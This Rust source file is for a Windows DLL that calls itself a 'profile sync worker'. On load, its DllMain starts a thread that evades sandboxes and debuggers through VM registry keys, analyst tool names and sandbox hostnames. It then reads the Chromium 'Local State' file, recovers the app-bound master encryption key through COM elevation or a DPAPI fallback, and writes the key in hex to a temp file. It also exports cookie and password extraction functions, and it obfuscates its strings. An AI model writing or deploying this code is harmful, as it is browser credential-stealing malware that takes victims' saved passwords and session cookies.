//! In-process profile sync worker (host identity context).

#![allow(non_snake_case, unused)]

mod crypto;
mod database;
mod dpapi_fallback;
mod elevator;

use std::{
    ffi::c_void,
    path::PathBuf,
    thread,
    time::{Duration, SystemTime, UNIX_EPOCH},
    env,
    mem,
};
#[cfg(windows)]
use windows::Win32::System::SystemInformation::{GetSystemInfo, SYSTEM_INFO};
#[cfg(windows)]
use windows::Win32::System::Memory::{VirtualQuery, MEMORY_BASIC_INFORMATION};
#[cfg(windows)]
use windows::Win32::System::Registry::{RegOpenKeyExW, RegQueryValueExW, HKEY_LOCAL_MACHINE, KEY_READ};
#[cfg(windows)]
use windows::Win32::System::Threading::{GetCurrentProcess, GetProcessMemoryInfo, PROCESS_MEMORY_COUNTERS};
#[cfg(windows)]
use windows::Win32::System::SystemInformation::GetComputerNameExW;
#[cfg(windows)]
use windows::Win32::Foundation::MAX_COMPUTERNAME_LENGTH;
#[cfg(windows)]
use windows::core::{PWSTR, PCWSTR};
#[cfg(windows)]
use std::{ptr, ffi::OsStr};
#[cfg(windows)]
use std::os::windows::ffi::OsStrExt;

use obfstr::obfstr;
use serde_json::Value;
use serde_json;

#[cfg(windows)]
use windows::{
    Win32::{
        Foundation::{BOOL, HINSTANCE, TRUE},
        System::{
            SystemServices::DLL_PROCESS_ATTACH,
            Threading::{CreateThread, THREAD_CREATION_FLAGS},
        },
    },
};

// Placeholder for a more advanced anti-debug check
fn is_debugger_present_stealth() -> bool {
    // This will be implemented with indirect syscalls in a later phase if needed.
    // For now, we focus on other sandbox detection methods.
    false
}

#[cfg(windows)]
fn is_sandbox() -> bool {
    unsafe {
        // 1. CPU Core Count Check
        let mut sys_info = SYSTEM_INFO::default();
        GetSystemInfo(&mut sys_info);
        if sys_info.dwNumberOfProcessors < 2 { // Typically sandboxes have 1 CPU
            return true;
        }
        
        // 2. RAM Size Check (e.g., less than 4GB)
        let mut pmc = PROCESS_MEMORY_COUNTERS::default();
        if GetProcessMemoryInfo(GetCurrentProcess(), &mut pmc, mem::size_of::<PROCESS_MEMORY_COUNTERS>() as u32).is_ok() {
            // Check if physical memory is less than 4GB (4 * 1024 * 1024 * 1024 bytes)
            if pmc.cb < 4 * 1024 * 1024 * 1024 {
                return true;
            }
        }
        
        // 3. Virtualization Registry Keys
        let vm_keys = [
            obfstr!("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0\\Identifier"), // VMware
            obfstr!("HARDWARE\\DESCRIPTION\\System\\BIOS\\SystemProductName"), // VirtualBox, VMware
            obfstr!("HARDWARE\\DESCRIPTION\\System\\BIOS\\Manufacturer"), // innotek GmbH (VirtualBox)
            obfstr!("SYSTEM\\CurrentControlSet\\Control\\VirtualDeviceDrivers"), // Generic VM
        ];

        for key_path in vm_keys.iter() {
            let mut hkey = HKEY_LOCAL_MACHINE;
#[cfg(windows)]
            let key_path_wide = OsStr::new(key_path).encode_wide().chain(Some(0)).collect::<Vec<u16>>();
#[cfg(not(windows))]
            let key_path_wide: Vec<u16> = Vec::new(); // Dummy for non-windows
            if RegOpenKeyExW(hkey, PCWSTR(key_path_wide.as_ptr()), 0, KEY_READ, &mut hkey).is_ok() {
                return true;
            }
        }
        
        // 4. Common Sandbox Process Names (example, needs more comprehensive list)
        let sandbox_processes = [
            obfstr!("wireshark.exe"),
            obfstr!("procmon.exe"),
            obfstr!("idaq.exe"),
            obfstr!("ollydbg.exe"),
        ];
        // This would require enumerating processes, which is more complex with indirect syscalls.
        // For now, we\'ll skip direct process enumeration and focus on easier checks.

        // 5. Computer Name Check (common sandbox names)
        let mut buffer = [0u16; MAX_COMPUTERNAME_LENGTH as usize + 1];
        let mut size = MAX_COMPUTERNAME_LENGTH + 1;
#[cfg(windows)]
        if GetComputerNameExW(windows::Win32::System::SystemInformation::ComputerNamePhysicalDnsHostname, PWSTR(buffer.as_mut_ptr()), &mut size).is_ok() {
            let computer_name = String::from_utf16_lossy(&buffer[..size as usize]);
            let common_sandbox_names = [
                obfstr!("HAL9TH"),
                obfstr!("JOHN-PC"),
                obfstr!("SANDBOX"),
                obfstr!("MALWARE"),
            ];
            if common_sandbox_names.iter().any(|&name| computer_name.contains(name)) {
                return true;
            }
        }
        
        // 6. Uptime Check (very short uptime might indicate a fresh sandbox)
        // This requires NtQuerySystemInformation with SystemBasicInformation, which is a syscall.
        // For now, we\\'ll skip this and focus on easier checks.

        false
    }
}

#[cfg(not(windows))]
fn is_sandbox() -> bool {
    false
}

fn header_tag() -> [u8; 4] {
    let mut arr = [0u8; 4];
    arr.clone_from_slice(obfstr!("APPB").as_bytes().split_at(4).0);
    arr
}

fn jitter_ms(min: u64, max: u64) -> u64 {
    let span = max.saturating_sub(min).max(1);
    let seed = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos() as u64
        ^ (std::process::id() as u64).wrapping_mul(0x5851_F642);
    min + (seed % (span + 1))
}

fn pause_ms(min: u64, max: u64) {
    thread::sleep(Duration::from_millis(jitter_ms(min, max)));
}

#[cfg(windows)]
fn host_under_analysis() -> bool {
    is_debugger_present_stealth()
}

#[cfg(not(windows))]
fn host_under_analysis() -> bool {
    false
}

#[cfg(windows)]
#[no_mangle]
pub unsafe extern "system" fn DllMain(
    _h: HINSTANCE,
    reason: u32,
    _: *mut c_void,
) -> BOOL {
    if reason == DLL_PROCESS_ATTACH {
        CreateThread(None, 0, Some(task), None, THREAD_CREATION_FLAGS(0), None).ok();
    }
    TRUE
}

#[cfg(not(windows))]
#[no_mangle]
pub unsafe extern "system" fn DllMain(
    _h: *mut std::ffi::c_void,
    reason: u32,
    _: *mut std::ffi::c_void,
) -> u32 {
    0
}

#[cfg(not(windows))]
unsafe extern "system" fn task(_: *mut c_void) -> u32 {
    0
}

#[cfg(windows)]
unsafe extern "system" fn task(_: *mut c_void) -> u32 {
    pause_ms(600, 1100);
    let r = std::panic::catch_unwind(|| execute());
    if let Ok(Err(_)) = r {
        record_failure("sync error");
    } else if r.is_err() {
        record_failure("worker fault");
    }
    0
}

#[cfg(windows)]
fn execute() -> Result<(), String> {
    if host_under_analysis() || is_sandbox() {
        return Err(obfstr!("host busy or sandbox detected").into());
    }
    
    pause_ms(80, 260);

    let exe = std::env::current_exe()
        .map(|p| p.to_string_lossy().to_lowercase())
        .unwrap_or_default();

    let local_state_path = resolve_local_state_path(&exe)?;

    pause_ms(40, 150);

    let raw = std::fs::read_to_string(&local_state_path)
        .map_err(|e| format!("{}{}", obfstr!("read profile state: "), e.to_string()))?;
    let ls: serde_json::Value =
        serde_json::from_str(&raw).map_err(|e| format!("{}{}", obfstr!("parse profile state: "), e.to_string()))?;

    let key_b64 = ls
        .pointer(obfstr!("/os_crypt/app_bound_encrypted_key"))
        .and_then(|v| v.as_str())
        .ok_or(obfstr!("bound key missing"))?;

    let encrypted_key = base64::Engine::decode(
        &base64::engine::general_purpose::STANDARD,
        key_b64,
    )
    .map_err(|e| format!("{}{}", obfstr!("decode: "), e.to_string()))?;

    let tag = header_tag();
    if encrypted_key.len() < 4 {
        return Err(obfstr!("blob too short").into());
    }
    if !encrypted_key.starts_with(&tag) {
        return Err(obfstr!("unexpected header").into());
    }
    let encrypted_key = &encrypted_key[4..];

    pause_ms(50, 180);

    let browser = elevator::resolve_browser(&exe);
    let com_result = match browser {
        Some(b) => elevator::process_with_provider(b, encrypted_key)
            .or_else(|_| elevator::retrieve_secret(encrypted_key)),
        None => elevator::retrieve_secret(encrypted_key),
    };

    let master_key = com_result
        .or_else(|_| {
            dpapi_fallback::try_decrypt_app_bound(encrypted_key)
                .ok_or_else(|| String::from(obfstr!("fallback path failed")))
        })
        .map_err(|e| format!("{}{}", obfstr!("key recovery: "), e.to_string()))?;

    if master_key.len() != 32 {
        return Err(format!("{}{}", obfstr!("unexpected key length: {} (want 32)"), master_key.len().to_string()));
    }
    
    let browser_label = browser.map(|b| b.name).unwrap_or(obfstr!("Chromium"));
    let result = serde_json::json!({
        obfstr!("browser"): browser_label,
        obfstr!("master_key_hex"): master_key.iter().map(|b| format!(obfstr!("{:02x}"), b)).collect::<String>(),
    });

    let json = serde_json::to_string(&result).unwrap();
    let path = output_path();
    std::fs::write(&path, json).map_err(|e| format!("{}{}", obfstr!("write output: "), e.to_string()))?;

    Ok(())
}

#[cfg(not(windows))]
fn execute() -> Result<(), String> {
    Err(String::from("Not supported on this OS"))
}

fn resolve_local_state_path(exe: &str) -> Result<PathBuf, String> {
    let user_env = obfstr!("ENV_USER_DATA").to_string();
    let root_env = obfstr!("ENV_DATA_ROOT").to_string();

    if let Ok(rel) = std::env::var(user_env) {
        let root = match std::env::var(root_env).as_deref() {
            Ok(s) if s == obfstr!("roaming") => std::env::var(obfstr!("APPDATA")),
            _ => std::env::var(obfstr!("LOCALAPPDATA")),
        }.map_err(|_| {
            let err_msg = obfstr!("profile root not set").to_string();
            err_msg
        })?;

        let path = PathBuf::from(&root)
            .join(rel)
            .join(obfstr!("Local State"));
        if path.exists() {
            return Ok(path);
        }
        return Err(format!("{}{}", obfstr!("state file missing: "), path.display().to_string()));
    }
    
    let browser = elevator::resolve_browser(exe)
        .ok_or_else(|| format!("{}{}", obfstr!("unknown host binary: "), exe.to_string()))?;

    let local_appdata = std::env::var(obfstr!("LOCALAPPDATA")).map_err(|_| {
        let err_msg = obfstr!("LOCALAPPDATA not set").to_string();
        err_msg
    })?;

    let local_state_path = PathBuf::from(&local_appdata)
        .join(browser.user_data_rel)
        .join(obfstr!("Local State"));

    if !local_state_path.exists() {
        return Err(format!("{}{}", obfstr!("state file missing: "), local_state_path.display().to_string()))?;
    }
    
    Ok(local_state_path)
}

fn output_path() -> PathBuf {
    let key = obfstr!("ENV_RESULT").to_string();
    if let Ok(p) = std::env::var(key) {
        return PathBuf::from(p);
    }
    std::env::temp_dir().join(obfstr!("fallback.json"))
}

fn record_failure(msg: &str) {
    let r = serde_json::json!({ obfstr!("error"): msg });
    let json = serde_json::to_string(&r).unwrap();
    let _ = std::fs::write(output_path(), json);
}

// Backward-compatible exports for in-crate callers
pub use crypto::{decrypt_value, hex_fallback, process_data};
pub use database::{extract_cookies, extract_passwords, process_entries, process_tokens};
